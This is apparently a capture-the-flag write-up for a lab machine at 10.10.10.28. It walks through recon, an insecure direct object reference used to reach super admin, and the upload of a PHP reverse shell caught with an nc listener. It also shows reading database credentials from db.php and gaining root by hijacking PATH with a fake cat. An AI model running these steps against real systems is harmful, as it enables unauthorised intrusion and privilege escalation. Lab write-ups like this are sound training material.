# 10.10.10.28

---

# nmap -sS -sC -sV -O -oX ./nmap/init.xml 10.10.10.28

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

---

##  gobuster -w ./../SecLists-2021.2/Discovery/Web-Content/quickhits.txt -u 10.10.10.28 -q -r dir

```
//index.phps (Status: 403)
//server-status/ (Status: 403)
//uploads/ (Status: 403)
```

---

## Found exploit for OpenSSH <7.7 Username Enumeration

++ [Exploit-db](https://www.exploit-db.com/exploits/45233)

Python code is in `exploit_ssh_7_6.py`.

Code seems to be broken. Even after fixing parantesis problems.

---

## Used Burp to examine the site.

Packages reveal `10.10.10.28/cdn-cgi/login`.

Login site has Username and Password requirements.

Simply by tring:

Username: admin

Pass: MEGACORP_4dm1n!!

---

## Sublinks:

Clients link exposes:
```
Client ID	Name	Email
1	Tafcz	john@tafcz.co.uk
```

Account link exposes:
```
Access ID	Name	Email
34322	admin	admin@megacorp.com
```

Uploads page is locked behind super admin rights.

---

## Attacking with Burp repeater

`id=1` variable is exposed through the URL. We can enumerate this.

After using Burp to attack, the id for super admin gets exposed.

Super Admin ID: 30

---

## Accessing account page of Super Admin

There is no authorazitation gate. Modifiying the payload on Burp to match Super Admin's ID reveals their account page:
```
Access ID	Name	Email
86575	super admin	superadmin@megacorp.com
```

Super Admin Access ID: 86575

Role: super admin

---

## Get reverse shell inside the system

Reverse shell with PHP from ++ [here.](https://github.com/pentestmonkey/php-reverse-shell)

Saved in .reverse-shell.php

Needs IP and Port supplied.

We upload this file and modify the payload again.

---

## Finding where it ended up

Python program [dirsearch](https://github.com/maurosoria/dirsearch) helps out here.

---

## python3 dirsearch.py -u http://10.10.10.28 -e php

```
[02:57:11] 301 -  312B  - /uploads  ->  http://10.10.10.28/uploads/
```

---

## curl http://10.10.10.28/uploads/reverse-shell.php

```
sudo nc -lvnp 443	//	To listen.
```

---

## After the reverse shell, we search for credentials.

Going back to the website's folders reveals `db.php`. Inside it are some credentials:
```
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

Username: robert

Pass: M3g4C0rpUs3r!

Using `id robert` reveals:
```
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Using `su robert` and entering the pass enables us to take over `robert` user's identity.

---

## find / type f -group bugtracker 2>/dev/null

```
/usr/bin/bugtracker
```

---

## ls -la bugtracker

```
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 bugtracker
```

It is owned by root. Let's run it.

---

## The reverse shell dropped, but we have credentials.

After `ssh robert@10.10.10.28`, we enter the same pass and we are in. This is officially.

---

## We use `strings` on bugtracker

```
...
cat /root/reports/
...
```

This is a relative path instead of absolute. We can abuse this.

---

## Creating a shell disguised as cat

```
export PATH=/tmp:$PATH
cd /tmp/
echo '/bin/sh' > cat
chmod +x cat
```

---

## We run bugtracker once more and supply id=1 as the bug id.

This runs cat on the local working directory. It was cat in it and it is run by root priviliges. But cat is actually a shell and now we have privileged shell.

---

Last thing I have done is to remove false cat file and `tmp` from PATH. Now I can cat out root.txt and this is it.
